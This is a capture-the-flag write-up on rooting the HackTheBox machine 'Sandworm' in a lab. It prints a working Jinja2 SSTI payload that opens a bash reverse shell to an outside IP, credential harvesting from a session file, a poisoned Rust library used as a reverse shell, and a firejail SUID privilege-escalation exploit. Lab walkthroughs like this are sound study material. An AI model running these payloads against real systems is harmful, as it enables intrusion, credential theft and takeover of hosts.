i add the machine to the /etc/hosts:
	
	sudo su
	echo "10.10.11.218	ssa.htb" >> /etc/hosts

So now we can scan the machine with a rustscan:
	
	rustscan -a ssa.htb	
output:
	
	PORTS	PROTOCOL
	22		ssh
	80		http
	443		https

I take a look at the web server on port 80:
is a server of an agency for telecomunication that showcase the use of pgp keys.
PGP (PRETTY GOOD PRIVACY) is a protocol for encryption e authority verification on the web such as
the darkweb.
we can see what directory we have (we need -k for not veryfing certificate):
	
	feroxbuster -u http://ssa.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k
output:
	
	200      GET       23l       44w      668c https://ssa.htb/static/scripts.js
	302      GET        5l       22w      225c https://ssa.htb/view => https://ssa.htb/login?next=%2Fview
	200      GET        6l      374w    21258c https://ssa.htb/static/popper.min.js
	200      GET        1l       10w    41992c https://ssa.htb/static/favicon.ico
	200      GET        7l     1031w    78130c https://ssa.htb/static/bootstrap.bundle.min.js
	200      GET     1346l     6662w    63667c https://ssa.htb/static/bootstrap-icons.css
	200      GET        3l     1297w    89477c https://ssa.htb/static/jquery.min.js
	302      GET        5l       22w      227c https://ssa.htb/admin => https://ssa.htb/login?next=%2Fadmin
	200      GET      304l     1591w   115308c https://ssa.htb/static/eagl2.png
	200      GET       77l      554w     5584c https://ssa.htb/about
	200      GET       69l      261w     3543c https://ssa.htb/contact
	200      GET      155l      691w     9043c https://ssa.htb/guide/verify
	200      GET      155l      691w     9043c https://ssa.htb/guide/encrypt
	200      GET       54l       61w     3187c https://ssa.htb/pgp
	200      GET      155l      691w     9043c https://ssa.htb/guide
	200      GET     2019l    10020w    95610c https://ssa.htb/static/bootstrap-icons2.css
	200      GET    12292l    23040w   222220c https://ssa.htb/static/styles.css
	200      GET       83l      249w     4392c https://ssa.htb/login
	200      GET    10161l    60431w  4580604c https://ssa.htb/static/circleLogo2.png
	200      GET      124l      634w     8161c https://ssa.htb/
	302      GET        5l       22w      229c https://ssa.htb/logout => https://ssa.htb/login?next=%2Flogout
	[REDACTED]

in the directory we found there is an aerea where we can verify a message sent by us signed via PGP
so i send a message signed on this site:
	
	http://www.2pih.com/pgp.html
i generated the keys here:
	
	https://pgpkeygen.com/

when the key is veryfied the server print a popup with the information of our key...
so i tought that i could maybe inject code inside the popup.
The server is made in python flask as we reed on the bottom of the page, so maybe
we can try a ssti jinja2.
In the description field i tried a classic payload:
	
	{{7*7}}
output:
	
	{{49}}
PERFECT, the application is vulnerable to ssti

so i go on by crafting the payload and start a listener on the background (i use pwncat):
	
	python3 -m pwncat  
	connect -lp 4444
i tried this payload and worked for me:
	
	{{config.__class__.__init__.__globals__['os'].popen('bash -c "/bin/bash -i >& /dev/tcp/10.10.14.49/4444 0>&1"').read()}}
I GOT A SHELL.
is actually a terrible shell, but still RCE.
i "upgrade" it:
	
	/bin/bash
and keep on with the enumeration, i have very little commands to run.
I start going around inside filesystem and i found something odd inside a directory:
	
	cd /home/atlas/.config/httpie/sessions/localhost_5000/admin.json
inside it there is what we need:
	
	username: silentobserver
	password: [REDACTED]
so now we can log inside the actual machine and not the sandbox:
	
	python3 -m pwncat
	connect ssh://silentobserver:[REDACTED]@ssa.htb:22
WE ARE IN AS USER!
so we can upload linpeas with pwncat:
	
	Ctrl + d
	Upload Pentest/linepeas.sh /home/silentobserver/linpeas.sh
	Ctrl + d
	bash /tmp/linpeas.sh

We found a strange process runned by root as atlas user:
	
	./tipnet
This process is a rust script that permit u to do an upstream.
But the odd part is the library that it loads are writable for us:
in particular we can poison the lib.rs library to insert our rust revshell:
	
	 extern crate chrono;

	use std::fs::OpenOptions;
	use std::io::Write;
	use chrono::prelude::*;
	use std::process::Command;

	[REDACTED]

	    if output.status.success() {
	        let stdout = String::from_utf8_lossy(&output.stdout);
	        let stderr = String::from_utf8_lossy(&output.stderr);

	        println!("standar output: {}", stdout);
	        println!("error output: {}", stderr);
	    } else {
	        let stderr = String::from_utf8_lossy(&output.stderr);
	        eprintln!("Error: {}", stderr);
	    }

	    let now = Local::now();
	    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
	    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

	    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
	        Ok(file) => file,
	        Err(e) => {
	            println!("Error opening log file: {}", e);
	            return;
	        }
	    };

	    if let Err(e) = file.write_all(log_message.as_bytes()) {
	        println!("Error writing to log file: {}", e);
	    }
	}
so i upload the revshell via pwncat:
	
	Ctrl + d
	upload Pentest/lib.rs lib.rs
	Ctrl + d
and now we set up our listener:
	
	python3 -m pwncat
	connect -lp 4444
WE GOT A SHELL as atlas;
so now we can keep on enumerating with this next user:
	
	bash /tmp/linpeas.sh
linpeas return something interesting: the firejail binary as the SUID bit set on.
So i search online for SUID exploit for firejail and found this:
	
	https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
so i upload the python script on the machine make it executable with:
	
	chmod +x exploit.py
and execute it:
	
	python3 exploit.py
output:
	
	You can now run 'firejail --join=310279' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
so we need to create another shell session with the previuos exploit
Once we got the second shell we can launch the command above:
	
	firejail --join=310279
	su -
(we don't actually need the sudo unless u type sudo -u root -)
output:
	
	#root@sandworm:~#

WE ARE NOW ROOT and we can submit our flag

i rooted this machine with the help of my friend AleHelp (https://github.com/AleHelp) on github